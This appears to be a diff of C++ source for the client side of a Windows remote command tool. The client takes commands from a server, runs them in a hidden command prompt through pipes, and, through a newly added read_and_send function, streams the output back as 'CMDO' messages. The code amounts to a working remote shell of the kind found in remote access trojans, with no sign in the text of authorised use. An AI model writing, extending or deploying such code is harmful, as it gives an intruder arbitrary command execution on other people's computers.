@@ -39,8 +39,8 @@ void client::data_parser(string type, int size, string data)
 	else if (type == "CMDE") { // command execute only once
 		cout << "execute:" << data << endl;
 		cmd_init(CommandPrompt);
-		command(data);
-		send_data("kys");
+		string output;
+		command(data, output);
 	}
 	else if (type == "CMDS") { // command prompt shell interactive START
 		cout << "TYPE: " << type << endl
@@ -306,7 +306,7 @@ bool client::read_cmd(string command, int length, string &output)
 			output_cmd[minimum_size] = '\0';
 
 			output_stream << output_cmd;
-			string output = output_cmd;
+			output = output_cmd;
 
 			delete[] output_cmd; // unless delete the output_cmd would get to >400mb of memory
 
@@ -337,6 +337,61 @@ bool client::read_cmd(string command, int length, string &output)
 	output = output_stream.str();
 	return 0;
 }
+
+bool client::read_and_send(string command, int length) {
+	while (true)
+	{
+		Sömn();
+
+		DWORD bytes_available;
+
+		bool PeekPipe = PeekNamedPipe(STDOUTR, NULL, 0, NULL, &bytes_available, 0);
+
+		if (!PeekPipe) return 0;
+
+		if (bytes_available != 0) {
+			char * output_cmd = new char[pipe_size];
+
+			bool ReadF = ReadFile(STDOUTR, output_cmd, min(pipe_size, bytes_available), NULL, NULL);
+
+			if (!(ReadF)) return 0;
+
+			int minimum_size = min(pipe_size, bytes_available);
+
+			output_cmd[minimum_size] = '\0';
+
+			string output = output_cmd;
+
+			delete[] output_cmd; // unless delete the output_cmd would get to >400mb of memory
+
+			auto command_index = 0;
+
+			for (; command_index < length; command_index++) { if (output[command_index] == command[command_index]) { continue; } else { break; } }
+			
+			string last2chars = output.substr(output.length() - 2);
+			
+			bool end_cmd = (output.back() == '>');
+
+			bool end_ps = (last2chars == "> ");
+
+			bool end_cst = (last2chars == custom_esc);
+			
+			send_data(output.substr(command_index), "CMDO");
+			
+			if (end_cmd || end_ps || end_cst) {
+				//free(output_cmd);
+				//output_cmd = NULL;
+				break;
+			}
+		}
+		else if (!get_alive_cmd() || force_quit) {
+			break;
+		}
+	}
+	send_data(" ", "CMDE");
+	return 0;
+}
+
 
 bool client::read_cmd(string command = "", int length = 0)
 {
@@ -557,11 +612,9 @@ void client::command(string command)
 
 		client::write_cmd(parsed_command.c_str(), command_size);
 
-		string output;
+		string otp;
 
-		client::read_cmd(parsed_command.c_str(), command_size, output);
-
-
+		client::read_cmd(parsed_command.c_str(), command_size, otp);
 		//cout << output << endl;
 	}
 
@@ -591,7 +644,7 @@ void client::command(string command, string &output)
 
 		string output_str;
 
-		client::read_cmd(parsed_command.c_str(), command_size, output_str);
+		client::read_and_send(parsed_command.c_str(), command_size);
 
 		output = output_str;
 	}
